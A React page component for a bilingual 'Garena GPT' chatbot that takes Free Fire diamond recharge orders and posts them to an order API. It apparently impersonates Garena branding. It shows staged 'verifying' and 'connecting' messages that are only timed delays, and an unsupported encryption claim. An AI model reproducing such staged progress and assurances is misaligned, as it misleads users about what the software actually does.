import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import { motion, AnimatePresence } from "motion/react";
import { Bot, User, Send, ShieldCheck, CheckCircle2, Menu, LogOut, Loader2, Sparkles, AlertTriangle, ClipboardList, Search, ShieldAlert, Facebook, Instagram, Mail, X, Check, ArrowLeft } from "lucide-react";
import { useLanguage } from "../context/LanguageContext";
import Modal from "../components/Modal";

type MessageType = 'start' | 'diamonds' | 'ask_id' | 'processing' | 'done' | 'text';

interface Message {
  id: string;
  sender: 'ai' | 'user';
  text: string;
  type?: MessageType;
}

export default function Charge() {
  const { t, language } = useLanguage();
  const navigate = useNavigate();
  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
  const loggedInUser = JSON.parse(localStorage.getItem('ff_user') || '{}');
  
  // Form State
  const [formData, setFormData] = useState({
    account_id: "",
    diamonds: "",
  });

  const [messages, setMessages] = useState<Message[]>([
    {
      id: Date.now().toString(),
      sender: 'ai',
      text: language === 'ar' 
        ? 'مرحباً بك في مركز Garena GPT للذكاء الاصطناعي! 🤖 أنا هنا لمساعدتك في تقديم طلب الشحن الخاص بك بكل سهولة وبسرعة. اضغط على "البدء" لننطلق.' 
        : 'Welcome to Garena GPT! 🤖 I am here to help you submit your recharge request easily and quickly. Click "Start" to begin.',
      type: 'start'
    }
  ]);
  
  const [inputText, setInputText] = useState("");
  const [inputType, setInputType] = useState<"text" | "number">("text");
  const [isTyping, setIsTyping] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  
  const [termsModal, setTermsModal] = useState(false);
  useEffect(() => {
    const termsAccepted = localStorage.getItem('ff_terms_accepted');
    if (!termsAccepted) {
      setTermsModal(true);
    }
  }, []);
  
  const acceptTerms = () => {
    localStorage.setItem('ff_terms_accepted', 'true');
    setTermsModal(false);
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isTyping]);

  const addAiMessage = (text: string, type: MessageType, delay = 1000) => {
    setIsTyping(true);
    setTimeout(() => {
      setIsTyping(false);
      setMessages(prev => [...prev, { id: Date.now().toString(), sender: 'ai', text, type }]);
    }, delay);
  };

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { id: Date.now().toString(), sender: 'user', text, type: 'text' }]);
  };

  const handleStart = () => {
    addUserMessage(language === 'ar' ? 'البدء' : 'Start');
    addAiMessage(
      language === 'ar' ? 'رائع! دعنا نبدأ. كم عدد الجواهر أو نوع العرض الذي تريد شحنه؟' : 'Great! Let\'s begin. How many diamonds or what package do you want?', 
      'diamonds'
    );
  };

  const handleDiamondsSelect = (d: string) => {
    setFormData(prev => ({ ...prev, diamonds: d }));
    addUserMessage(d);
    
    const accId = loggedInUser?.account_id;
    if (accId) {
      addAiMessage(
        language === 'ar' ? `هل هذا هو الأيدي الخاص بك؟ (${accId}) أم تريد إدخال أيدي آخر؟` : `Is this your ID? (${accId}) Or do you want to enter another ID?`,
        'ask_id'
      );
    } else {
      addAiMessage(
        language === 'ar' ? 'يرجى إدخال الأيدي الخاص بك:' : 'Please enter your ID:',
        'ask_id'
      );
    }
    setInputType("number");
  };

  const handleIdSubmit = (idValue?: string) => {
    const finalId = idValue || inputText.trim();
    if (!finalId) return;
    
    setFormData(prev => ({ ...prev, account_id: finalId }));
    addUserMessage(finalId);
    setInputText("");
    
    submitOrder(finalId);
  };

  const submitOrder = async (finalId: string) => {
    const processStepsAr = [
      "جاري التحقق من المعرف...",
      "جاري الاتصال بالخادم...",
      "جاري إرسال الطلب..."
    ];
    const processStepsEn = [
      "Verifying ID...",
      "Connecting to server...",
      "Sending request..."
    ];
    const steps = language === 'ar' ? processStepsAr : processStepsEn;
    
    setIsTyping(true);
    
    for (let i = 0; i < steps.length; i++) {
      await new Promise(resolve => setTimeout(resolve, 1500));
      setMessages(prev => [...prev, { id: Date.now().toString() + i, sender: 'ai', text: steps[i], type: 'processing' }]);
    }
    
    try {
      const token = localStorage.getItem("ff_token");
      const res = await axios.post("/api/orders", {
        token,
        platform: "ID",
        email: loggedInUser?.temp_email || "test@test.com",
        platform_password: "N/A",
        level: "N/A",
        charged: "N/A",
        diamonds: formData.diamonds,
        account_id: finalId
      });
      
      const orderNum = res.data.order_number;
      setIsTyping(false);
      setMessages(prev => [
        ...prev, 
        { 
          id: Date.now().toString(), 
          sender: 'ai', 
          text: language === 'ar' 
            ? `✅ تمت العملية بنجاح! تم استلام طلبك ورقم الطلب الخاص بك هو: ${orderNum}. يمكنك متابعة حالة طلبك من قسم طلباتي.`
            : `✅ Process completed successfully! Your order has been received, order number: ${orderNum}. You can track it in My Orders.`,
          type: 'done' 
        }
      ]);
    } catch (error) {
      setIsTyping(false);
      setMessages(prev => [
        ...prev, 
        { 
          id: Date.now().toString(), 
          sender: 'ai', 
          text: language === 'ar' 
            ? `❌ عذراً، حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى لاحقاً.`
            : `❌ Sorry, an error occurred while sending the request. Please try again later.`,
          type: 'done' 
        }
      ]);
    }
  };

  const currentMessageType = messages[messages.length - 1]?.sender === 'ai' ? messages[messages.length - 1]?.type : null;

  const diamondOptions = [
    { label: "100 + 10 💎", value: "100" },
    { label: "210 + 21 💎", value: "210" },
    { label: "310 + 31 💎", value: "310" },
    { label: "520 + 52 💎", value: "520" },
    { label: "Monthly Membership 💎", value: "Monthly Membership" },
    { label: "Weekly Membership 💎", value: "Weekly Membership" },
    { label: "Booyah Pass 🔥", value: "Booyah Pass" },
  ];

  const renderOptions = () => {
    if (isTyping) return null;
    
    switch (currentMessageType) {
      case 'start':
        return (
          <button 
            onClick={handleStart}
            className="w-full sm:w-auto bg-[#CD1212] hover:bg-red-700 text-white font-bold py-3 px-8 rounded-xl shadow-lg shadow-red-600/20 active:scale-95 transition-all text-sm flex items-center justify-center gap-2 mt-2"
          >
            <Sparkles className="h-5 w-5" />
            {language === 'ar' ? 'البدء' : 'Start'}
          </button>
        );
      case 'diamonds':
        return (
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 mt-3 w-full max-w-lg">
            {diamondOptions.map(d => (
              <button key={d.value} onClick={() => handleDiamondsSelect(d.value)} className="bg-white border border-gray-200 text-gray-800 hover:border-red-500 hover:text-red-600 font-bold py-3 px-4 rounded-xl shadow-sm transition-all text-sm text-center active:scale-95 flex items-center justify-center">
                {d.label}
              </button>
            ))}
          </div>
        );
      case 'ask_id':
        const accId = loggedInUser?.account_id;
        if (!accId) return null;
        return (
          <div className="flex flex-wrap gap-2 mt-3">
            <button 
              onClick={() => handleIdSubmit(accId)}
              className="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 px-6 rounded-xl shadow-lg shadow-emerald-600/20 active:scale-95 transition-all text-sm flex items-center justify-center gap-2"
            >
              <Check className="h-5 w-5" />
              {language === 'ar' ? 'نعم، هذا هو الأيدي الخاص بي' : 'Yes, this is my ID'}
            </button>
          </div>
        );
      case 'done':
        return (
          <button 
            onClick={() => navigate('/my-orders')}
            className="w-full sm:w-auto bg-[#CD1212] hover:bg-red-700 text-white font-bold py-3 px-8 rounded-xl shadow-lg shadow-red-600/20 active:scale-95 transition-all text-sm flex items-center justify-center gap-2 mt-3"
          >
            {language === 'ar' ? 'الذهاب إلى طلباتي' : 'Go to My Orders'}
            <ArrowLeft className={`h-5 w-5 ${language === 'ar' ? 'rotate-0' : 'rotate-180'}`} />
          </button>
        );
      default:
        return null;
    }
  };

  const showInput = currentMessageType === 'ask_id';

  return (
    <div className={`min-h-screen bg-[#F8F9FA] font-sans flex flex-col ${language === 'ar' ? 'text-right' : 'text-left'}`} dir={language === 'ar' ? 'rtl' : 'ltr'}>
      {/* Header */}
      <header className="sticky top-0 z-40 w-full border-b border-gray-100 bg-white/80 backdrop-blur-xl shadow-sm">
        <div className="mx-auto flex h-16 max-w-7xl items-center justify-between px-4 sm:px-6">
          <div className="flex items-center gap-3">
            <button onClick={() => setIsSidebarOpen(true)} className="rounded-xl p-2 text-gray-600 hover:bg-gray-100 transition-colors">
              <Menu className="h-6 w-6" />
            </button>
            <div className="flex items-center gap-2">
              <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-gradient-to-br from-[#CD1212] to-red-700 shadow-md">
                <Bot className="h-5 w-5 text-white" />
              </div>
              <span className="text-xl font-black tracking-tight text-gray-900 hidden sm:block">
                Garena <span className="text-[#CD1212]">GPT</span>
              </span>
            </div>
          </div>
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-2 px-3 py-1.5 bg-white border border-gray-200 shadow-sm rounded-full">
              <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.6)]"></div>
              <span className="text-xs font-black text-gray-800 tracking-wide">
                Garena <span className="text-[#CD1212]">GPT</span>
              </span>
            </div>
          </div>
        </div>
      </header>

      {/* Main Chat Area */}
      <main className="flex-1 flex flex-col w-full max-w-3xl mx-auto px-4 sm:px-6 py-6 pb-32">
        <div className="flex-1 space-y-6">
          <AnimatePresence>
            {messages.map((msg, index) => (
              <motion.div
                key={msg.id}
                initial={{ opacity: 0, y: 10, scale: 0.95 }}
                animate={{ opacity: 1, y: 0, scale: 1 }}
                transition={{ duration: 0.3 }}
                className={`flex gap-3 ${msg.sender === 'user' ? 'justify-end' : 'justify-start'}`}
              >
                {msg.sender === 'ai' && (
                  <div className="flex-shrink-0 w-8 h-8 rounded-full bg-gradient-to-br from-[#CD1212] to-red-700 flex items-center justify-center shadow-md mt-1">
                    <Bot className="h-4 w-4 text-white" />
                  </div>
                )}
                
                <div className={`max-w-[85%] sm:max-w-[75%] rounded-2xl px-5 py-3.5 text-sm sm:text-base font-medium leading-relaxed ${
                  msg.sender === 'user' 
                    ? 'bg-[#CD1212] text-white rounded-tl-none shadow-md shadow-red-600/10' 
                    : msg.type === 'processing' 
                      ? 'bg-blue-50 text-blue-800 border border-blue-100 shadow-sm rounded-tr-none'
                    : msg.type === 'done'
                      ? 'bg-emerald-50 text-emerald-900 border border-emerald-100 shadow-sm rounded-tr-none'
                    : 'bg-white text-gray-800 border border-gray-100 shadow-sm rounded-tr-none'
                }`}>
                  {msg.text}
                  {msg.sender === 'ai' && msg.id === messages[messages.length - 1]?.id && (
                    <div className="mt-2">
                      {renderOptions()}
                    </div>
                  )}
                </div>

                {msg.sender === 'user' && (
                  <div className="flex-shrink-0 w-8 h-8 rounded-full bg-gray-200 flex items-center justify-center mt-1">
                    <User className="h-4 w-4 text-gray-500" />
                  </div>
                )}
              </motion.div>
            ))}
          </AnimatePresence>
          
          {isTyping && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="flex gap-3 justify-start"
            >
              <div className="flex-shrink-0 w-8 h-8 rounded-full bg-gradient-to-br from-[#CD1212] to-red-700 flex items-center justify-center shadow-md mt-1">
                <Bot className="h-4 w-4 text-white" />
              </div>
              <div className="bg-white border border-gray-100 shadow-sm rounded-2xl rounded-tr-none px-5 py-4 flex items-center gap-1.5 w-16">
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "0.15s" }}></div>
                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: "0.3s" }}></div>
              </div>
            </motion.div>
          )}
          
          <div ref={messagesEndRef} />
        </div>
      </main>

      {/* Input Area */}
      <AnimatePresence>
        {showInput && !isTyping && (
          <motion.div 
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 50 }}
            className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t border-gray-100 shadow-[0_-10px_30px_rgba(0,0,0,0.05)] z-30"
          >
            <div className="max-w-3xl mx-auto flex gap-2">
              <input
                type={inputType}
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter') {
                    if (currentMessageType === 'ask_id') handleIdSubmit();
                  }
                }}
                placeholder={language === 'ar' ? 'أدخل الأيدي الخاص بك...' : 'Enter your ID...'}
                dir="ltr"
                className="flex-1 rounded-xl border border-gray-200 bg-gray-50 px-4 py-3.5 text-sm font-bold text-gray-900 outline-none transition-all focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100 text-left"
              />
              <button
                onClick={() => {
                  if (currentMessageType === 'ask_id') handleIdSubmit();
                }}
                disabled={!inputText.trim()}
                className="flex items-center justify-center rounded-xl bg-[#CD1212] px-5 text-white transition-all hover:bg-red-700 active:scale-95 disabled:bg-gray-300 disabled:opacity-50"
              >
                <Send className={`h-5 w-5 ${language === 'ar' ? 'rotate-180' : ''}`} />
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      <Modal 
        isOpen={termsModal} 
        onClose={acceptTerms}
        title={language === 'ar' ? 'تنبيه الأمان والخصوصية' : 'Security Notice'}
      >
        <div className={`p-2 space-y-4 ${language === 'ar' ? 'text-right' : 'text-left'}`}>
          <div className="flex items-start gap-3 bg-red-50 p-4 rounded-xl border border-red-100">
            <ShieldCheck className="w-6 h-6 text-red-600 flex-shrink-0 mt-0.5" />
            <p className="text-sm font-bold text-red-900 leading-relaxed">
              {language === 'ar' 
                ? 'يتم استخدام معلوماتك حصرياً لإتمام عملية الشحن، ويتم تشفيرها بأمان تام.' 
                : 'Your info is used exclusively for the recharge process and is securely encrypted.'}
            </p>
          </div>
          <button 
            onClick={acceptTerms}
            className="w-full mt-2 rounded-xl bg-[#CD1212] text-white py-3 font-bold shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all text-sm"
          >
            {language === 'ar' ? 'موافق ومتابعة' : 'Accept & Continue'}
          </button>
        </div>
      </Modal>

      <AnimatePresence>
        {isSidebarOpen && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] bg-black/50 backdrop-blur-sm"
            onClick={() => setIsSidebarOpen(false)}
          />
        )}
      </AnimatePresence>

      {/* Sidebar */}
      <AnimatePresence>
        {isSidebarOpen && (
          <motion.div 
            initial={{ x: language === 'ar' ? '100%' : '-100%' }}
            animate={{ x: 0 }}
            exit={{ x: language === 'ar' ? '100%' : '-100%' }}
            transition={{ type: "spring", bounce: 0, duration: 0.3 }}
            className={`fixed top-0 bottom-0 ${language === 'ar' ? 'right-0' : 'left-0'} z-[110] w-[280px] sm:w-72 bg-white shadow-2xl flex flex-col`}
          >
            <div className={`flex items-center justify-between p-4 border-b border-gray-100 ${language === 'ar' ? '' : 'flex-row-reverse'}`}>
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-gray-100 rounded-full flex items-center justify-center border-2 border-red-100">
                  <User className="h-5 w-5 text-red-600" />
                </div>
                <div className="text-right">
                  <div className="font-bold text-gray-900 truncate max-w-[120px]">{loggedInUser?.account_id || loggedInUser?.temp_email?.split('@')[0]}</div>
                </div>
              </div>
              <button 
                onClick={() => setIsSidebarOpen(false)}
                className="p-2 rounded-full hover:bg-gray-100 transition-colors"
              >
                <X className="h-5 w-5 text-gray-500" />
              </button>
            </div>
            
            <div className="flex-1 overflow-y-auto py-6 px-4 space-y-2">
               <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/my-orders'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <ClipboardList className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {language === 'ar' ? 'طلباتي' : 'My Orders'}
              </button>
              <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/account'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <User className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {language === 'ar' ? 'الحساب' : 'Account'}
              </button>
              <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/email'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <Mail className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {language === 'ar' ? 'البريد المؤقت' : 'Temp Email'}
              </button>
              <button 
                onClick={() => { setIsSidebarOpen(false); navigate('/admin'); }}
                className="flex w-full items-center rounded-xl bg-gray-50 p-4 font-bold text-gray-700 transition-colors hover:bg-red-50 hover:text-red-600"
              >
                <ShieldAlert className={`h-5 w-5 text-gray-500 ${language === 'ar' ? 'ml-3' : 'mr-3'}`} />
                {language === 'ar' ? 'لوحة الإدارة' : 'Admin Panel'}
              </button>
            </div>
            
            <div className="p-4 border-t border-gray-100">
              <button onClick={() => {
                localStorage.removeItem('ff_token');
                localStorage.removeItem('ff_user');
                window.location.href = '/';
              }} className="w-full flex items-center justify-center gap-2 p-3 rounded-xl bg-red-50 text-red-600 font-bold hover:bg-red-100 transition-colors">
                <LogOut className="h-5 w-5" />
                {language === 'ar' ? 'تسجيل الخروج' : 'Logout'}
              </button>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
